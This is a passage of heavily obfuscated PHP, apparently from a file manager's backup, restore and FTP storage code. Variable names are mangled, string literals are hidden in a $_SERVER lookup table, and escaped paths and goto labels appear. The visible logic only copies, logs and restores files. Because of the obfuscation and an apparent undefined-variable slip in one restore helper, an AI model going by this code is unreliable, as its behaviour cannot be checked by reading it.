$§Ÿ›¬”â->task[$ƒº³şïñ[855]] = $¼÷½¡Ãí; foreach ($™êıŒ¸¸[$ƒº³şïñ[86]] as $ÊÇßæì¾) { $ğÚù®Ì… = IO::move($ÊÇßæì¾[$ƒº³şïñ[87]], $ÁÃª¼¥±); if (!$ğÚù®Ì…) { $§Ÿ›¬”â->end(); $ö¼Œ€‡ = IO::getLastError($ƒº³şïñ[899] . $ÊÇßæì¾[$ƒº³şïñ[87]] . $ƒº³şïñ[900] . $ÁÃª¼¥± . $ƒº³şïñ[175]); Backup::log($ö¼Œ€‡); return !1; } } $§Ÿ›¬”â->end(); $èÌ˜ùòı = array($ƒº³şïñ[901] => $¼÷½¡Ãí, $ƒº³şïñ[902] => time()); Backup::set($èÌ˜ùòı); return !0; } private function backupPath($˜öö× ï) { $¶«ñ°ëÈ =& $_SERVER[¹Éµ„ºå]; $¤ØĞ¹ñÙ = $˜öö× ï[$¶«ñ°ëÈ[32]]; $‰‘¾Šœ = Model($¶«ñ°ëÈ[864])->get($¶«ñ°ëÈ[865]); $´¿üµ…œ = substr(md5($¶«ñ°ëÈ[866] . $‰‘¾Šœ . $¤ØĞ¹ñÙ), 0, 8); return "\x7b\151\157\72{$˜öö× ï[$¶«ñ°ëÈ[843]]}\x7d\57\x64\x61\164\x61\x62\x61\163\145\x2f\142\141\x63\x6b\x75\160\x2f" . $¤ØĞ¹ñÙ . $¶«ñ°ëÈ[11] . $´¿üµ…œ; } private function tmpFilesPath() { $‚»³•İ± =& $_SERVER[¹Éµ„ºå]; $Ë•Ã¹óº = TEMP_FILES; if ($GLOBALS[$‚»³•İ±[6]][$‚»³•İ±[92]][$‚»³•İ±[889]]) { $Ë•Ã¹óº = $GLOBALS[$‚»³•İ±[6]][$‚»³•İ±[92]][$‚»³•İ±[889]]; if (!mk_dir($Ë•Ã¹óº) || !is_writable($Ë•Ã¹óº) || !IO::mkfile($Ë•Ã¹óº . $‚»³•İ±[890])) { $Ë•Ã¹óº = TEMP_FILES; } } return $Ë•Ã¹óº; } } class BackupFile { protected $bakVer = "\157\154\144"; public function __construct($³Ë…óÊò = false) { $í‡Ú…ñş =& $_SERVER[¹Éµ„ºå]; $this->bakVer = $³Ë…óÊò ? $í‡Ú…ñş[903] : $í‡Ú…ñş[904]; } public function index() { $ï¯©’ = Backup::get(); $éó®³ÒÌ = $ï¯©’[$_SERVER[¹Éµ„ºå][847]][$_SERVER[¹Éµ„ºå][230]][$_SERVER[¹Éµ„ºå][557]]; $şà€€Øá = array($_SERVER[¹Éµ„ºå][558] => array($_SERVER[¹Éµ„ºå][905], $éó®³ÒÌ), $_SERVER[¹Éµ„ºå][906] => array($_SERVER[¹Éµ„ºå][406], $ï¯©’[$_SERVER[¹Éµ„ºå][843]])); $–¤÷¸™ = (int) Model($_SERVER[¹Éµ„ºå][907])->where($şà€€Øá)->count($_SERVER[¹Éµ„ºå][557]); $­Ñø£İ® = (int) Model($_SERVER[¹Éµ„ºå][907])->where($şà€€Øá)->sum($_SERVER[¹Éµ„ºå][79]); $êè¿Ûàœ = new TaskFileTransfer($_SERVER[¹Éµ„ºå][908], $_SERVER[¹Éµ„ºå][870], $–¤÷¸™, LNG($_SERVER[¹Éµ„ºå][878]) . $_SERVER[¹Éµ„ºå][879] . LNG($_SERVER[¹Éµ„ºå][909])); $êè¿Ûàœ->task[$_SERVER[¹Éµ„ºå][855]] = $­Ñø£İ®; $Ş‰ãĞõ = array($_SERVER[¹Éµ„ºå][910] => $–¤÷¸™, $_SERVER[¹Éµ„ºå][911] => $­Ñø£İ®, $_SERVER[¹Éµ„ºå][912] => time()); Backup::set($Ş‰ãĞõ); $òæŞıÅ¦ = !0; $¯ñŒÛˆâ = $this->storeIds(); $÷ü£¤®ù = 1; $¸ïç¶… = 1000; $äıƒÆô¶ = $à‹ü¬é¯ = 0; $–½¢“óù = array(); $â•¥ÑœÈ = $ÜÔà¼òõ = 0; do { $½° ûÂ = $_SERVER[¹Éµ„ºå][913]; $­†Áçà† = Model($_SERVER[¹Éµ„ºå][907])->where($şà€€Øá)->field($½° ûÂ)->order($_SERVER[¹Éµ„ºå][914])->selectPage($¸ïç¶…, $÷ü£¤®ù); $Ï™ıÁº = !empty($­†Áçà†[$_SERVER[¹Éµ„ºå][446]]) ? $­†Áçà†[$_SERVER[¹Éµ„ºå][446]] : array(); foreach ($Ï™ıÁº as $ÕË¼¸) { if (!$this->_fileExist($ÕË¼¸, $–½¢“óù, $¯ñŒÛˆâ)) { Backup::log($_SERVER[¹Éµ„ºå][915] . $ÕË¼¸[$_SERVER[¹Éµ„ºå][557]] . $_SERVER[¹Éµ„ºå][916] . $ÕË¼¸[$_SERVER[¹Éµ„ºå][87]]); continue; } $Ì‚ñğã = $ÕË¼¸[$_SERVER[¹Éµ„ºå][87]]; $ÖäŠ·®œ = "\173\x69\x6f\72{$ï¯©’[$_SERVER[¹Éµ„ºå][843]]}\175" . substr($Ì‚ñğã, strlen("\173\151\x6f\72{$ÕË¼¸[$_SERVER[¹Éµ„ºå][917]]}\x7d")); if (IO::exist($ÖäŠ·®œ)) { $êè¿Ûàœ->updateFileEnd($ÕË¼¸[$_SERVER[¹Éµ„ºå][32]], $ÕË¼¸[$_SERVER[¹Éµ„ºå][79]]); } else { $ÖäŠ·®œ = get_path_father($ÖäŠ·®œ); IO::mkdir($ÖäŠ·®œ); if (!IO::copy($Ì‚ñğã, $ÖäŠ·®œ, $_SERVER[¹Éµ„ºå][918])) { Backup::log($_SERVER[¹Éµ„ºå][919] . $Ì‚ñğã . $_SERVER[¹Éµ„ºå][900] . $ÖäŠ·®œ . $_SERVER[¹Éµ„ºå][175]); $òæŞıÅ¦ = !1; break; } } $éó®³ÒÌ = $ÕË¼¸[$_SERVER[¹Éµ„ºå][557]]; $à‹ü¬é¯ += 1; $äıƒÆô¶ += $ÕË¼¸[$_SERVER[¹Éµ„ºå][79]]; $ÜÔà¼òõ += 1; $â•¥ÑœÈ += $ÕË¼¸[$_SERVER[¹Éµ„ºå][79]]; if ($äıƒÆô¶ >= 1024 * 1024 * 100) { $Ş‰ãĞõ = array($_SERVER[¹Éµ„ºå][842] => $éó®³ÒÌ, $_SERVER[¹Éµ„ºå][920] => $ÜÔà¼òõ, $_SERVER[¹Éµ„ºå][921] => $â•¥ÑœÈ); Backup::set($Ş‰ãĞõ); $äıƒÆô¶ = $à‹ü¬é¯ = 0; } } $Æ’¡ñãê = count($Ï™ıÁº); $÷ü£¤®ù++; } while ($Æ’¡ñãê == $¸ïç¶…); $êè¿Ûàœ->end(); $Ş‰ãĞõ = array($_SERVER[¹Éµ„ºå][922] => 1, $_SERVER[¹Éµ„ºå][853] => time(), $_SERVER[¹Éµ„ºå][869] => 1, $_SERVER[¹Éµ„ºå][842] => $éó®³ÒÌ, $_SERVER[¹Éµ„ºå][923] => time()); if ($à‹ü¬é¯) { $Ş‰ãĞõ[$_SERVER[¹Éµ„ºå][920]] = $ÜÔà¼òõ; $Ş‰ãĞõ[$_SERVER[¹Éµ„ºå][921]] = $â•¥ÑœÈ; } Backup::set($Ş‰ãĞõ); return !0; } private function _fileExist($ö­„ÌÊŸ, &$ÜËÉşŒ, $æÓÓß§ô) { $—›ä÷• =& $_SERVER[¹Éµ„ºå]; $†²Ìöˆ = $ö­„ÌÊŸ[$—›ä÷•[87]]; if (in_array($ö­„ÌÊŸ[$—›ä÷•[557]], $ÜËÉşŒ)) { return !1; } if (!in_array($ö­„ÌÊŸ[$—›ä÷•[917]], $æÓÓß§ô)) { return !1; } if (IO::exist($†²Ìöˆ)) { return !0; } $½ÁÙ˜‰‘ = get_path_father($†²Ìöˆ); if (IO::exist($½ÁÙ˜‰‘)) { $ÜËÉşŒ[] = $ö­„ÌÊŸ[$—›ä÷•[557]]; return !1; } $õİË÷Ò = array($—›ä÷•[917] => $ö­„ÌÊŸ[$—›ä÷•[917]], $—›ä÷•[87] => array($—›ä÷•[473], "{$½ÁÙ˜‰‘}\x25")); $°õŞŸãù = Model($—›ä÷•[907])->where($õİË÷Ò)->field($—›ä÷•[558])->select(); $ÜËÉşŒ = array_merge($ÜËÉşŒ, array_to_keyvalue($°õŞŸãù, $—›ä÷•[12], $—›ä÷•[557])); return !1; } private function _fileFilter($í‡Íàöñ) { $‡¡‹ı’ =& $_SERVER[¹Éµ„ºå]; return; if (empty($í‡Íàöñ)) { return; } $†‹÷À©¿ = array($‡¡‹ı’[557] => array($‡¡‹ı’[7], array_unique($í‡Íàöñ))); $ñ¡ŠÃê„ = Model($‡¡‹ı’[924])->where($†‹÷À©¿)->field($‡¡‹ı’[191])->select(); foreach ($ñ¡ŠÃê„ as $á¯áŠİÂ) { Model($‡¡‹ı’[924])->remove($á¯áŠİÂ[$‡¡‹ı’[191]], !1); } } private function storeIds() { $€Öö˜Ó³ =& $_SERVER[¹Éµ„ºå]; $ƒ¡ÕÓæ” = Model($€Öö˜Ó³[859])->listData(); $­®‘õÕ½ = array(); $şÉ£¶‹ü = $GLOBALS[$€Öö˜Ó³[6]][$€Öö˜Ó³[92]][$€Öö˜Ó³[925]]; foreach ($ƒ¡ÕÓæ” as $Ñ¢ƒÆÎı) { $ÌÖ›‡µÅ = strtolower($Ñ¢ƒÆÎı[$€Öö˜Ó³[96]]); if (!isset($şÉ£¶‹ü[$ÌÖ›‡µÅ])) { continue; } $…ÊÈ°àì = $€Öö˜Ó³[77] . (isset($şÉ£¶‹ü[$ÌÖ›‡µÅ]) ? $şÉ£¶‹ü[$ÌÖ›‡µÅ] : ucfirst($ÌÖ›‡µÅ)); if (!class_exists($…ÊÈ°àì)) { continue; } $­®‘õÕ½[] = $Ñ¢ƒÆÎı[$€Öö˜Ó³[487]]; } return $­®‘õÕ½; } public function start($Æí¾Ë½ñ, $¬Ì•–³) { $ã“…ö³š =& $_SERVER[¹Éµ„ºå]; $Øè¥ÓÉ½ = KodIO::makePath(KodIO::KOD_IO, $Æí¾Ë½ñ); if (!$this->checkStore($Æí¾Ë½ñ)) { write_log($ã“…ö³š[926] . $Øè¥ÓÉ½, $ã“…ö³š[927]); return; } $­£Ä—­ = KodIO::defaultDriver(); if ($­£Ä—­[$ã“…ö³š[487]] == $Æí¾Ë½ñ) { write_log($ã“…ö³š[928] . $Øè¥ÓÉ½, $ã“…ö³š[927]); return; } $Ã÷¸ŸŠò = $ã“…ö³š[929]; $Ñ¡—¥ÎË = Task::get($Ã÷¸ŸŠò); if ($Ñ¡—¥ÎË) { if ($Ñ¡—¥ÎË[$ã“…ö³š[841]] == $ã“…ö³š[930]) { return; } Task::kill($Ã÷¸ŸŠò); } $‘Öúğã = array($ã“…ö³š[843] => $Æí¾Ë½ñ, $ã“…ö³š[557] => 0, $ã“…ö³š[204] => 0, $ã“…ö³š[847] => array($ã“…ö³š[850] => 0, $ã“…ö³š[931] => 0, $ã“…ö³š[855] => 0, $ã“…ö³š[932] => 0, $ã“…ö³š[933] => 0)); $†›­Š® = Model($ã“…ö³š[864])->get($ã“…ö³š[934], $ã“…ö³š[870]); $†›­Š® = json_decode($†›­Š®, !0); if (!$†›­Š®) { $†›­Š® = array(); } if ($†›­Š®[$ã“…ö³š[843]] && $†›­Š®[$ã“…ö³š[843]] != $Æí¾Ë½ñ) { $†›­Š®[$ã“…ö³š[557]] = 0; $†›­Š®[$ã“…ö³š[843]] = $Æí¾Ë½ñ; } $†›­Š® = array_merge($‘Öúğã, $†›­Š®); $ĞËøŞ©— = _get($GLOBALS, $ã“…ö³š[7], array()); if ($ĞËøŞ©—[$ã“…ö³š[846]] == $ã“…ö³š[91] && $ĞËøŞ©—[$ã“…ö³š[935]] == $ã“…ö³š[91] || !$†›­Š®[$ã“…ö³š[557]]) { $†›­Š® = $‘Öúğã; } $Øè¥ÓÉ½ = KodIO::makePath(KodIO::KOD_IO, $†›­Š®[$ã“…ö³š[843]]); $¿èÇŠº = $Øè¥ÓÉ½ . $ã“…ö³š[936]; if (!file_exists($¿èÇŠº)) { $óÊ¯ÃÅÇ = file_get_contents(__DIR__ . $ã“…ö³š[937]); if (defined($ã“…ö³š[938]) && INSTALL_CHANNEL) { $óÊ¯ÃÅÇ = str_replace($ã“…ö³š[939], INSTALL_CHANNEL, $óÊ¯ÃÅÇ); } file_put_contents($¿èÇŠº, $óÊ¯ÃÅÇ); } $—Ì¸£÷û = $¬Ì•–³ * 60 * 0.8; $êÒ¨Ô¯„ = timeFloat(); $û…·ô‹î = Model($ã“…ö³š[560]); $™Ğİ€öİ = array($ã“…ö³š[558] => array($ã“…ö³š[905], $†›­Š®[$ã“…ö³š[557]])); $€£ÍèâÆ = $û…·ô‹î->field(array($ã“…ö³š[940] => $ã“…ö³š[941], $ã“…ö³š[942] => $ã“…ö³š[79]))->where($™Ğİ€öİ)->find(); if (!$€£ÍèâÆ[$ã“…ö³š[941]]) { return; } $ÊÅ‚Ú· = intval($€£ÍèâÆ[$ã“…ö³š[941]]); $ªğÆü×õ = intval($€£ÍèâÆ[$ã“…ö³š[79]]); $†›­Š®[$ã“…ö³š[847]][$ã“…ö³š[850]] += $ÊÅ‚Ú·; $†›­Š®[$ã“…ö³š[847]][$ã“…ö³š[855]] += $ªğÆü×õ; $†›­Š®[$ã“…ö³š[204]] = time(); Model($ã“…ö³š[864])->set($ã“…ö³š[934], $†›­Š®, $ã“…ö³š[870]); $Ñ¡—¥ÎË = new TaskFileTransfer($Ã÷¸ŸŠò, $ã“…ö³š[870], $ÊÅ‚Ú·, LNG($ã“…ö³š[878]) . $ã“…ö³š[879] . LNG($ã“…ö³š[909])); $Ñ¡—¥ÎË->task[$ã“…ö³š[855]] = $ªğÆü×õ; $©ÔíáíÑ = 500; $¶±™ªËÔ = 1; $ê•©ÑÜ = $ã“…ö³š[913]; $ÎãßÒ§ = $û…·ô‹î->where($™Ğİ€öİ)->field($ê•©ÑÜ)->order($ã“…ö³š[914])->selectPage($©ÔíáíÑ, $¶±™ªËÔ); $ö€úÈÜÚ = array($ã“…ö³š[850] => 0, $ã“…ö³š[943] => 0, $ã“…ö³š[933] => 0, $ã“…ö³š[944] => $†›­Š®[$ã“…ö³š[557]], $ã“…ö³š[945] => 0); $ã•îÑ‹´ = intval($ÎãßÒ§[$ã“…ö³š[443]][$ã“…ö³š[445]]); while ($ÎãßÒ§ && $¶±™ªËÔ <= $ã•îÑ‹´) { if (timeFloat() - $êÒ¨Ô¯„ > $—Ì¸£÷û) { break; } foreach ($ÎãßÒ§[$ã“…ö³š[446]] as $¾¹ÔÓˆï) { if (timeFloat() - $êÒ¨Ô¯„ > $—Ì¸£÷û) { break; } $ö€úÈÜÚ[$ã“…ö³š[850]]++; $ö€úÈÜÚ[$ã“…ö³š[945]] = $¾¹ÔÓˆï[$ã“…ö³š[557]]; $†›­Š®[$ã“…ö³š[557]] = $¾¹ÔÓˆï[$ã“…ö³š[557]]; $†›­Š®[$ã“…ö³š[847]][$ã“…ö³š[931]]++; $†›­Š®[$ã“…ö³š[847]][$ã“…ö³š[932]] += $¾¹ÔÓˆï[$ã“…ö³š[79]]; $¢×ğº« = $¾¹ÔÓˆï[$ã“…ö³š[87]]; if (!$this->isFileExist($¾¹ÔÓˆï, $û…·ô‹î)) { $Ñ¡—¥ÎË->updateFileEnd($¾¹ÔÓˆï[$ã“…ö³š[32]], $¾¹ÔÓˆï[$ã“…ö³š[79]]); $†›­Š®[$ã“…ö³š[847]][$ã“…ö³š[933]]++; $ö€úÈÜÚ[$ã“…ö³š[943]]++; write_log($ã“…ö³š[915] . $¾¹ÔÓˆï[$ã“…ö³š[557]] . $ã“…ö³š[916] . $¢×ğº«, $ã“…ö³š[927]); continue; } $Ö·€û÷³ = $Øè¥ÓÉ½ . substr($¢×ğº«, strlen("\173\151\x6f\72{$¾¹ÔÓˆï[$ã“…ö³š[917]]}\x7d\x2f")); if (IO::exist($Ö·€û÷³)) { $Ñ¡—¥ÎË->updateFileEnd($¾¹ÔÓˆï[$ã“…ö³š[32]], $¾¹ÔÓˆï[$ã“…ö³š[79]]); continue; } $Ö·€û÷³ = get_path_father($Ö·€û÷³); if (!IO::copy($¢×ğº«, $Ö·€û÷³, REPEAT_SKIP)) { $†›­Š®[$ã“…ö³š[847]][$ã“…ö³š[933]]++; $ö€úÈÜÚ[$ã“…ö³š[933]]++; write_log($ã“…ö³š[946] . $¾¹ÔÓˆï[$ã“…ö³š[557]] . $ã“…ö³š[916] . $¢×ğº«, $ã“…ö³š[927]); } $Ñ¡—¥ÎË->updateFileEnd($¾¹ÔÓˆï[$ã“…ö³š[32]], $¾¹ÔÓˆï[$ã“…ö³š[79]]); } Model($ã“…ö³š[864])->set($ã“…ö³š[934], $†›­Š®, $ã“…ö³š[870]); $¶±™ªËÔ++; $ÎãßÒ§ = $û…·ô‹î->where($™Ğİ€öİ)->field($ê•©ÑÜ)->order($ã“…ö³š[914])->selectPage($©ÔíáíÑ, $¶±™ªËÔ); } $Ñ¡—¥ÎË->end(); write_log($ã“…ö³š[947] . json_encode($ö€úÈÜÚ), $ã“…ö³š[927]); if (IO::mkdir($Øè¥ÓÉ½ . $ã“…ö³š[948])) { $ö€úÈÜÚ[$ã“…ö³š[945]] = $†›­Š®[$ã“…ö³š[557]]; IO::setContent($Øè¥ÓÉ½ . $ã“…ö³š[949] . date($ã“…ö³š[950]) . $ã“…ö³š[951], json_encode($ö€úÈÜÚ)); } Model($ã“…ö³š[864])->set($ã“…ö³š[934], $†›­Š®, $ã“…ö³š[870]); return !0; } private function isFileExist($°ñŒÑç, $ıÅÕ¦») { $“Æ—·Ë =& $_SERVER[¹Éµ„ºå]; static $É ¶‚Ú = null; static $˜ğÔ²‰ = null; if (is_null($É ¶‚Ú)) { $É ¶‚Ú = $˜ğÔ²‰ = array(); } $ƒÕ†Ş² = $°ñŒÑç[$“Æ—·Ë[917]]; $º¦æ¹¶× = KodIO::parse($°ñŒÑç[$“Æ—·Ë[87]]); if ($ƒÕ†Ş² != $º¦æ¹¶×[$“Æ—·Ë[487]]) { return !1; } if (!isset($É ¶‚Ú[$ƒÕ†Ş²])) { $É ¶‚Ú[$ƒÕ†Ş²] = $this->checkStore($ƒÕ†Ş²); } if ($É ¶‚Ú[$ƒÕ†Ş²] !== 1) { return !1; } if (in_array($°ñŒÑç[$“Æ—·Ë[557]], $˜ğÔ²‰)) { return !1; } $´Â‹è¤œ = $°ñŒÑç[$“Æ—·Ë[87]]; if (IO::exist($´Â‹è¤œ)) { return !0; } $ƒÚó·« = get_path_father($´Â‹è¤œ); if (IO::exist($ƒÚó·«)) { $˜ğÔ²‰[] = $°ñŒÑç[$“Æ—·Ë[557]]; return !1; } $éœøÂ˜ = array($“Æ—·Ë[917] => $ƒÕ†Ş², $“Æ—·Ë[87] => array($“Æ—·Ë[473], "{$ƒÚó·«}\x25")); $‹’ÅæƒÑ = $ıÅÕ¦»->where($éœøÂ˜)->field($“Æ—·Ë[558])->select(); $˜ğÔ²‰ = array_merge($˜ğÔ²‰, array_to_keyvalue($‹’ÅæƒÑ, $“Æ—·Ë[12], $“Æ—·Ë[557])); return !1; } public function checkStore($ŞÀ·¤Ø) { static $ùêã½œà; if (is_null($ùêã½œà)) { $ùêã½œà = Model($_SERVER[¹Éµ„ºå][859]); } $»…ËÇô = $ùêã½œà->listData($ŞÀ·¤Ø); if (!$»…ËÇô) { return 0; } try { $‰û¨óàã = $ùêã½œà->checkConfig($»…ËÇô, !0); } catch (Exception $Ñİç‚Ãœ) { $‰û¨óàã = !1; } return $‰û¨óàã === !0 ? 1 : 0; } } class RestoreFile { public $message; public function __construct() { } public function start($¿®îÙ„) { $öĞìÉ® =& $_SERVER[¹Éµ„ºå]; $€àõ× Û = Model($öĞìÉ®[864]); if ($€àõ× Û->get($öĞìÉ®[952]) == $öĞìÉ®[953]) { $this->message = LNG($öĞìÉ®[954]); return !1; } $¿®îÙ„ = rtrim($¿®îÙ„, $öĞìÉ®[8]) . $öĞìÉ®[8]; $™¢¼İÓ = IO::listPath($¿®îÙ„); if (empty($™¢¼İÓ[$öĞìÉ®[85]]) && empty($™¢¼İÓ[$öĞìÉ®[86]])) { show_json(LNG($öĞìÉ®[955]), !1); } $ŒŸé«ğ = $öĞìÉ®[956]; $œòŞÀÏ÷ = Task::get($ŒŸé«ğ); if ($œòŞÀÏ÷) { if ($œòŞÀÏ÷[$öĞìÉ®[841]] == $öĞìÉ®[930]) { $this->message = LNG($öĞìÉ®[957]); return !0; } Task::kill($ŒŸé«ğ); } $‚ôÁÎ– = array($öĞìÉ®[87] => $¿®îÙ„, $öĞìÉ®[557] => 0, $öĞìÉ®[204] => 0, $öĞìÉ®[847] => array($öĞìÉ®[850] => 0, $öĞìÉ®[931] => 0, $öĞìÉ®[855] => 0, $öĞìÉ®[932] => 0, $öĞìÉ®[933] => 0), $öĞìÉ®[958] => array($öĞìÉ®[850] => 0, $öĞìÉ®[931] => 0, $öĞìÉ®[933] => 0)); $ğ×ÅàÔ‘ = $€àõ× Û->get($öĞìÉ®[934], $öĞìÉ®[959]); $ğ×ÅàÔ‘ = json_decode($ğ×ÅàÔ‘, !0); if (!$ğ×ÅàÔ‘) { $ğ×ÅàÔ‘ = array(); } $ğ×ÅàÔ‘ = array_merge($‚ôÁÎ–, $ğ×ÅàÔ‘); if (_get($GLOBALS, $öĞìÉ®[960], 0) == $öĞìÉ®[91] || !$ğ×ÅàÔ‘[$öĞìÉ®[557]]) { $ğ×ÅàÔ‘ = $‚ôÁÎ–; } $—¨üÈïù = Model($öĞìÉ®[560]); $Ù¦¥ğ = array($öĞìÉ®[558] => array($öĞìÉ®[905], $ğ×ÅàÔ‘[$öĞìÉ®[557]])); $Ç¨ãğ…â = $—¨üÈïù->field(array($öĞìÉ®[940] => $öĞìÉ®[941], $öĞìÉ®[942] => $öĞìÉ®[79]))->where($Ù¦¥ğ)->find(); if (!intval($Ç¨ãğ…â[$öĞìÉ®[941]])) { $this->message = LNG($öĞìÉ®[961]); return !0; } $’ã¡üÕÄ = intval($Ç¨ãğ…â[$öĞìÉ®[941]]); $½†åüëø = intval($Ç¨ãğ…â[$öĞìÉ®[79]]); $ğ×ÅàÔ‘[$öĞìÉ®[847]][$öĞìÉ®[850]] += $’ã¡üÕÄ; $ğ×ÅàÔ‘[$öĞìÉ®[847]][$öĞìÉ®[855]] += $½†åüëø; $ğ×ÅàÔ‘[$öĞìÉ®[958]][$öĞìÉ®[850]] = $’ã¡üÕÄ; $ğ×ÅàÔ‘[$öĞìÉ®[204]] = time(); $€àõ× Û->set($öĞìÉ®[934], $ğ×ÅàÔ‘, $öĞìÉ®[959]); $è†·¤¸ñ = KodIO::defaultDriver(); $üÉéô‡ = $è†·¤¸ñ[$öĞìÉ®[487]]; $È…®›ŠÂ = KodIO::makePath(KodIO::KOD_IO, $üÉéô‡); $œòŞÀÏ÷ = new TaskFileTransfer($ŒŸé«ğ, $öĞìÉ®[959], $’ã¡üÕÄ, LNG($öĞìÉ®[962]) . $öĞìÉ®[879] . LNG($öĞìÉ®[909])); $œòŞÀÏ÷->task[$öĞìÉ®[855]] = $½†åüëø; $Ù±ãÅÓÊ = 1000; $ÁØæƒı = 1; $è»ÚùÓ” = $öĞìÉ®[913]; $™¢¼İÓ = $—¨üÈïù->where($Ù¦¥ğ)->field($è»ÚùÓ”)->order($öĞìÉ®[914])->selectPage($Ù±ãÅÓÊ, $ÁØæƒı); $Ñä‘õ·× = intval($™¢¼İÓ[$öĞìÉ®[443]][$öĞìÉ®[445]]); while ($™¢¼İÓ && $ÁØæƒı <= $Ñä‘õ·×) { $ñĞÔ˜’© = array(); foreach ($™¢¼İÓ[$öĞìÉ®[446]] as $­ç€Ú‡) { $ğ×ÅàÔ‘[$öĞìÉ®[557]] = $­ç€Ú‡[$öĞìÉ®[557]]; $ğ×ÅàÔ‘[$öĞìÉ®[847]][$öĞìÉ®[931]]++; $ğ×ÅàÔ‘[$öĞìÉ®[847]][$öĞìÉ®[932]] += $­ç€Ú‡[$öĞìÉ®[79]]; $ğ×ÅàÔ‘[$öĞìÉ®[958]][$öĞìÉ®[931]]++; $¯ÄòÉ×¯ = $­ç€Ú‡[$öĞìÉ®[87]]; if (IO::exist($¯ÄòÉ×¯)) { $œòŞÀÏ÷->update(1); continue; } $ŠÉøŒ£ = substr($¯ÄòÉ×¯, strlen("\x7b\x69\x6f\72{$­ç€Ú‡[$öĞìÉ®[917]]}\x7d\x2f")); $œÄÆª‡ = $È…®›ŠÂ . $ŠÉøŒ£; if ($üÉéô‡ != $­ç€Ú‡[$öĞìÉ®[917]] && IO::exist($œÄÆª‡)) { $œòŞÀÏ÷->update(1); $ñĞÔ˜’©[$­ç€Ú‡[$öĞìÉ®[557]]] = $œÄÆª‡; continue; } $»´‹©‚ = $¿®îÙ„ . $ŠÉøŒ£; if (!$this->isFileExist($»´‹©‚)) { $œòŞÀÏ÷->update(1); $ğ×ÅàÔ‘[$öĞìÉ®[847]][$öĞìÉ®[933]]++; $ğ×ÅàÔ‘[$öĞìÉ®[958]][$öĞìÉ®[933]]++; write_log($öĞìÉ®[963] . $»´‹©‚, $öĞìÉ®[964]); continue; } $ö•ØÔ§µ = get_path_father($œÄÆª‡); IO::mkdir($ö•ØÔ§µ); if (!IO::copy($»´‹©‚, $ö•ØÔ§µ, REPEAT_SKIP)) { $ğ×ÅàÔ‘[$öĞìÉ®[847]][$öĞìÉ®[933]]++; $ğ×ÅàÔ‘[$öĞìÉ®[958]][$öĞìÉ®[933]]++; write_log($öĞìÉ®[965] . $»´‹©‚ . $öĞìÉ®[966] . $­ç€Ú‡[$öĞìÉ®[557]], $öĞìÉ®[964]); } else { $ñĞÔ˜’©[$­ç€Ú‡[$öĞìÉ®[557]]] = $œÄÆª‡; } $œòŞÀÏ÷->update(1); } $this->updateFileBatch($ğ×ÅàÔ‘, $ñĞÔ˜’©, $üÉéô‡); $ÁØæƒı++; $™¢¼İÓ = $—¨üÈïù->where($Ù¦¥ğ)->field($è»ÚùÓ”)->order($öĞìÉ®[914])->selectPage($Ù±ãÅÓÊ, $ÁØæƒı); } $œòŞÀÏ÷->end(); $this->updateFileBatch($ğ×ÅàÔ‘, $ñĞÔ˜’©, $üÉéô‡); $™¢¼İÓ = Model($öĞìÉ®[859])->listData(); $ÎòÌ„ÔÍ = array_to_keyvalue($™¢¼İÓ, $öĞìÉ®[12], $öĞìÉ®[487]); $ÓÁÆ‰ßÃ = md5($öĞìÉ®[967] . implode($öĞìÉ®[50], $ÎòÌ„ÔÍ)); Cache::remove($ÓÁÆ‰ßÃ); return !0; } private function isFileExist($şä›ïÌÇ) { static $š×ï¦¬Ü = null; if (is_null($”êâ¨Ò)) { $š×ï¦¬Ü = array(); } $¤æÀü€Ò = get_path_father($şä›ïÌÇ); if (in_array($¤æÀü€Ò, $š×ï¦¬Ü)) { return !1; } if (!IO::exist($¤æÀü€Ò)) { $š×ï¦¬Ü[] = $¤æÀü€Ò; return !1; } return IO::exist($şä›ïÌÇ); } private function updateFileBatch($ÆàÙ®÷ş, &$Äà‘Õï, $Èû¼‰êÄ) { $›°ß‘õä =& $_SERVER[¹Éµ„ºå]; Model($›°ß‘õä[864])->set($›°ß‘õä[934], $ÆàÙ®÷ş, $›°ß‘õä[959]); if (!$Äà‘Õï) { return; } $¤‹°Œ°° = Model($›°ß‘õä[560]); $‡ì®ÇÖƒ = $°¦Ïã™£ = array(); foreach ($Äà‘Õï as $‰™•Åé => $­šŠÊµë) { $‡ì®ÇÖƒ[] = array($›°ß‘õä[557], $‰™•Åé, $›°ß‘õä[917], $Èû¼‰êÄ); $°¦Ïã™£[] = array($›°ß‘õä[557], $‰™•Åé, $›°ß‘õä[87], $­šŠÊµë); } $¤‹°Œ°°->saveAll($‡ì®ÇÖƒ); $¤‹°Œ°°->saveAll($°¦Ïã™£); write_log($›°ß‘õä[968] . count($Äà‘Õï) . $›°ß‘õä[969] . $Èû¼‰êÄ, $›°ß‘õä[964]); $Äà‘Õï = array(); } private function updateFile($ã¼ šÎ, $ÆÙÅÚÀâ, $Û°¨‰·¾, $Úª½å±) { $áôâ©¹Î =& $_SERVER[¹Éµ„ºå]; $³ŒºÄ­ = array($áôâ©¹Î[917] => $ÆÙÅÚÀâ, $áôâ©¹Î[87] => $Û°¨‰·¾); $ö‹Ê ‹¢ = $Úª½å±->where(array($áôâ©¹Î[557] => $ã¼ šÎ))->save($³ŒºÄ­); if ($ö‹Ê ‹¢) { return; } write_log($áôâ©¹Î[970] . $ã¼ šÎ, $áôâ©¹Î[964]); } } goto e’é ÂŒ·¿; D‚‹è‹ñÒğ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($Ã·şÕ÷³) { parent::__construct(); if (count($Ã·şÕ÷³) > 0) { $this->_init($Ã·şÕ÷³); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ Àø¯Á) { $´¦Ğ”üş =& $_SERVER[¹Éµ„ºå]; global $config; $this->appCharset = $config[$´¦Ğ”üş[1636]]; $this->systemCharset = $config[$´¦Ğ”üş[1637]]; if (isset($ Àø¯Á[$´¦Ğ”üş[1638]]) && $ Àø¯Á[$´¦Ğ”üş[1638]]) { $this->systemCharset = $ Àø¯Á[$´¦Ğ”üş[1638]]; } } public function iconvApp($øÉ½™Õ•) { return $this->iconvTo($øÉ½™Õ•, $this->systemCharset, $this->appCharset); } public function iconvSystem($÷æÍ€ğù) { return $this->iconvTo($÷æÍ€ğù, $this->appCharset, $this->systemCharset); } public function getPathOuter($åüº™æ) { $ÈÎµä  =& $_SERVER[¹Éµ„ºå]; $Í‚¡²š = 